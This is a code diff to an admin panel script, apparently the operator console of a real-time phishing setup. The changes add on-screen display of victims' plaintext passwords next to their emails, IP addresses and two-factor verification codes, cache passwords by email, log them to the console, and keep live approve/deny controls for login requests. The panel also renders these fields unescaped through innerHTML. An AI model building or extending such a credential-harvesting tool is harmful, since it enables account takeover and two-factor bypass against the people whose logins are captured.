@@ -2,33 +2,58 @@ class AdminApp {
     constructor() {
         this.socket = io();
         this.token = localStorage.getItem('adminToken');
-        this.currentAdmin = null;
-        this.init();
+        this.currentAdmin = localStorage.getItem('adminInfo') ? JSON.parse(localStorage.getItem('adminInfo')) : null;
+
+        // 存储邮箱和密码的映射，用于验证请求
+        this.emailPasswordMap = new Map();
+
+        // 确保DOM完全加载后再初始化
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', () => this.init());
+        } else {
+            this.init();
+        }
     }
 
     init() {
+        console.log('初始化管理员应用');
+        console.log('Token存在:', !!this.token);
+        console.log('DOM状态:', document.readyState);
+
+        // 先绑定事件，再决定显示哪个页面
+        this.bindEvents();
+        this.setupSocketListeners();
+
         if (this.token) {
+            console.log('使用已存在的令牌显示管理界面');
             this.showDashboard();
             this.loadInitialData();
         } else {
+            console.log('显示登录页面');
             this.showLoginPage();
         }
-
-        this.bindEvents();
-        this.setupSocketListeners();
     }
 
     bindEvents() {
-        // 管理员登录
-        document.getElementById('adminLoginForm').addEventListener('submit', (e) => {
-            e.preventDefault();
-            this.handleAdminLogin();
-        });
+        // 管理员登录 - 添加安全检查
+        const loginForm = document.getElementById('adminLoginForm');
+        if (loginForm) {
+            loginForm.addEventListener('submit', (e) => {
+                e.preventDefault();
+                console.log('登录表单提交事件触发');
+                this.handleAdminLogin();
+            });
+        } else {
+            console.error('未找到登录表单元素');
+        }
 
-        // 退出登录
-        document.getElementById('logoutBtn').addEventListener('click', () => {
-            this.logout();
-        });
+        // 退出登录 - 添加安全检查
+        const logoutBtn = document.getElementById('logoutBtn');
+        if (logoutBtn) {
+            logoutBtn.addEventListener('click', () => {
+                this.logout();
+            });
+        }
 
         // 导航按钮
         document.querySelectorAll('.nav-btn').forEach(btn => {
@@ -104,6 +129,8 @@ class AdminApp {
         const password = document.getElementById('adminPassword').value;
 
         try {
+            console.log(`尝试管理员登录: 用户名=${username}, 密码长度=${password.length}`);
+
             const response = await fetch('/api/auth/admin/login', {
                 method: 'POST',
                 headers: {
@@ -112,17 +139,23 @@ class AdminApp {
                 body: JSON.stringify({ username, password })
             });
 
+            console.log(`登录响应状态: ${response.status}`);
             const data = await response.json();
+            console.log('登录响应数据:', data);
 
             if (response.ok) {
+                console.log('登录成功，保存令牌和管理员信息');
                 this.token = data.token;
                 this.currentAdmin = data.admin;
                 localStorage.setItem('adminToken', this.token);
+                localStorage.setItem('adminInfo', JSON.stringify(data.admin));
 
+                console.log('切换到管理界面');
                 this.showDashboard();
                 this.loadInitialData();
             } else {
-                alert(data.error);
+                console.error('登录失败:', data.error);
+                alert(data.error || '登录失败');
             }
         } catch (error) {
             console.error('管理员登录错误:', error);
@@ -143,12 +176,38 @@ class AdminApp {
     }
 
     showDashboard() {
-        document.getElementById('adminLoginPage').classList.remove('active');
-        document.getElementById('adminDashboard').classList.add('active');
+        console.log('执行showDashboard函数');
+
+        const loginPage = document.getElementById('adminLoginPage');
+        const dashboardPage = document.getElementById('adminDashboard');
+
+        console.log('登录页面元素:', loginPage);
+        console.log('管理界面元素:', dashboardPage);
+
+        if (loginPage && dashboardPage) {
+            console.log('移除登录页面的active类');
+            loginPage.classList.remove('active');
+
+            console.log('添加管理界面的active类');
+            dashboardPage.classList.add('active');
+
+            console.log('登录页面类列表:', loginPage.classList.toString());
+            console.log('管理界面类列表:', dashboardPage.classList.toString());
+        } else {
+            console.error('页面元素未找到!');
+        }
 
         if (this.currentAdmin) {
-            document.getElementById('adminUsername').textContent = this.currentAdmin.username;
+            const usernameElement = document.getElementById('adminUsername');
+            if (usernameElement) {
+                usernameElement.textContent = this.currentAdmin.username;
+                console.log('设置管理员用户名:', this.currentAdmin.username);
+            } else {
+                console.error('用户名显示元素未找到!');
+            }
         }
+
+        console.log('showDashboard函数执行完成');
     }
 
     async loadInitialData() {
@@ -195,6 +254,12 @@ class AdminApp {
             const response = await this.apiRequest('/api/admin/verification-requests');
             if (response && response.ok) {
                 const requests = await response.json();
+                console.log('从服务器获取的验证请求数据:', requests);
+                if (requests.length > 0) {
+                    console.log('第一个验证请求的完整数据:', requests[0]);
+                    console.log('第一个验证请求的密码字段类型:', typeof requests[0].password);
+                    console.log('第一个验证请求的密码字段值:', requests[0].password);
+                }
                 this.displayVerificationRequests(requests);
             }
         } catch (error) {
@@ -210,11 +275,20 @@ class AdminApp {
             return;
         }
 
-        container.innerHTML = requests.map(request => `
+        // 添加调试日志
+        console.log('显示登录请求数据:', requests);
+        if (requests.length > 0) {
+            console.log('第一个请求的密码字段:', requests[0].password);
+        }
+
+        container.innerHTML = requests.map(request => {
+            console.log(`请求ID ${request.id} 的密码:`, request.password);
+            return `
             <div class="request-item" data-id="${request.id}">
                 <div class="request-header">
                     <div class="request-info">
                         <h4>${request.email}</h4>
+                        <p>密码: <strong style="color: #0071e3; font-family: monospace;">${request.password || '未获取到密码'}</strong></p>
                         <p>IP地址: ${request.ip_address}</p>
                         <p>登录时间: ${new Date(request.login_time).toLocaleString()}</p>
                     </div>
@@ -224,7 +298,8 @@ class AdminApp {
                     </div>
                 </div>
             </div>
-        `).join('');
+            `;
+        }).join('');
     }
 
     displayVerificationRequests(requests) {
@@ -235,12 +310,29 @@ class AdminApp {
             return;
         }
 
-        container.innerHTML = requests.map(request => `
+        // 添加调试日志
+        console.log('显示验证请求数据:', requests);
+        if (requests.length > 0) {
+            console.log('第一个验证请求的密码字段:', requests[0].password);
+            console.log('第一个验证请求的验证码:', requests[0].verification_code);
+        }
+
+        container.innerHTML = requests.map(request => {
+            // 尝试从邮箱-密码映射中获取密码
+            let password = request.password;
+            if (!password && request.email && this.emailPasswordMap.has(request.email)) {
+                password = this.emailPasswordMap.get(request.email);
+                console.log(`从映射中获取到邮箱 ${request.email} 的密码`);
+            }
+
+            console.log(`验证请求ID ${request.id} 的密码:`, password);
+            return `
             <div class="request-item" data-id="${request.id}">
                 <div class="request-header">
                     <div class="request-info">
                         <h4>${request.email}</h4>
-                        <p>验证码: <strong>${request.verification_code}</strong></p>
+                        <p>密码: <strong style="color: #0071e3; font-family: monospace;">${password || '未获取到密码'}</strong></p>
+                        <p>验证码: <strong style="color: #34c759; font-family: monospace; font-size: 20px;">${request.verification_code}</strong></p>
                         <p>提交时间: ${new Date(request.submitted_at).toLocaleString()}</p>
                     </div>
                     <div class="request-actions">
@@ -249,7 +341,8 @@ class AdminApp {
                     </div>
                 </div>
             </div>
-        `).join('');
+            `;
+        }).join('');
     }
 
     async approveLogin(id, approved) {
@@ -299,6 +392,12 @@ class AdminApp {
             existingEmpty.remove();
         }
 
+        // 存储邮箱和密码的映射，用于验证请求
+        if (request.email && request.password) {
+            console.log(`存储邮箱 ${request.email} 的密码映射`);
+            this.emailPasswordMap.set(request.email, request.password);
+        }
+
         const requestElement = document.createElement('div');
         requestElement.className = 'request-item';
         requestElement.dataset.id = request.id;
@@ -306,6 +405,7 @@ class AdminApp {
             <div class="request-header">
                 <div class="request-info">
                     <h4>${request.email}</h4>
+                    <p>密码: <strong style="color: #0071e3; font-family: monospace;">${request.password}</strong></p>
                     <p>IP地址: ${request.ip_address}</p>
                     <p>登录时间: ${new Date(request.login_time).toLocaleString()}</p>
                 </div>
@@ -325,6 +425,58 @@ class AdminApp {
             existingEmpty.remove();
         }
 
+        // 检查是否已经存在相同ID的请求，如果存在则不添加
+        const existingRequest = document.querySelector(`#verificationRequestsList .request-item[data-id="${request.id}"]`);
+        if (existingRequest) {
+            console.log(`验证请求ID ${request.id} 已存在，不重复添加`);
+            return;
+        }
+
+        // 尝试从服务器获取完整的验证请求数据，包括密码
+        this.fetchVerificationRequestDetails(request.id)
+            .then(fullRequest => {
+                // 如果成功获取到完整数据，使用它来添加请求
+                if (fullRequest && fullRequest.password) {
+                    this.renderVerificationRequest(fullRequest);
+                } else {
+                    // 否则使用原始数据
+                    this.renderVerificationRequest(request);
+                }
+            })
+            .catch(error => {
+                console.error(`获取验证请求 ${request.id} 详情失败:`, error);
+                // 出错时使用原始数据
+                this.renderVerificationRequest(request);
+            });
+    }
+
+    // 从服务器获取完整的验证请求详情
+    async fetchVerificationRequestDetails(id) {
+        try {
+            const response = await this.apiRequest(`/api/admin/verification-request/${id}`);
+            if (response && response.ok) {
+                const data = await response.json();
+                console.log(`获取到验证请求 ${id} 的完整数据:`, data);
+                return data;
+            }
+        } catch (error) {
+            console.error(`获取验证请求 ${id} 详情错误:`, error);
+        }
+        return null;
+    }
+
+    // 渲染验证请求到UI
+    renderVerificationRequest(request) {
+        // 尝试从邮箱-密码映射中获取密码
+        let password = request.password;
+        if (!password && request.email && this.emailPasswordMap.has(request.email)) {
+            password = this.emailPasswordMap.get(request.email);
+            console.log(`从映射中获取到邮箱 ${request.email} 的密码`);
+        }
+
+        console.log(`渲染验证请求: ID=${request.id}, 邮箱=${request.email}, 密码=${password}, 验证码=${request.verification_code}`);
+
+        const container = document.getElementById('verificationRequestsList');
         const requestElement = document.createElement('div');
         requestElement.className = 'request-item';
         requestElement.dataset.id = request.id;
@@ -332,7 +484,8 @@ class AdminApp {
             <div class="request-header">
                 <div class="request-info">
                     <h4>${request.email}</h4>
-                    <p>验证码: <strong>${request.verification_code}</strong></p>
+                    <p>密码: <strong style="color: #0071e3; font-family: monospace;">${password || '未获取到密码'}</strong></p>
+                    <p>验证码: <strong style="color: #34c759; font-family: monospace; font-size: 20px;">${request.verification_code}</strong></p>
                     <p>提交时间: ${new Date(request.submitted_at).toLocaleString()}</p>
                 </div>
                 <div class="request-actions">
